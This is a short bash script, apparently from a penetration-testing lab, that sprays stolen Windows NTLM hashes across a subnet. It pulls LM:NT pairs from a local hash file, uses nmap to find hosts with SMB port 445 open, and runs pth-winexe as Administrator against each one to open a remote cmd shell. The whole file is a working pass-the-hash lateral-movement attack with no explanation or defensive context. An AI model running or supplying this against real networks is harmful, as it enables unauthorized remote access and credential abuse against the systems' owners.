#!/bin/bash


for smbhash in $(awk -F: '{print $3 ":" $4}' < ~/bin/passcrack/227/hashes ); do 

for host in $(nmap -p 445 192.168.15.200-254 -oG - | grep open | cut -d" " -f2); do 
    echo "[+] trying $host with $smbhash" 
    pth-winexe -U Administrator%$smbhash //$host cmd; 
done

done
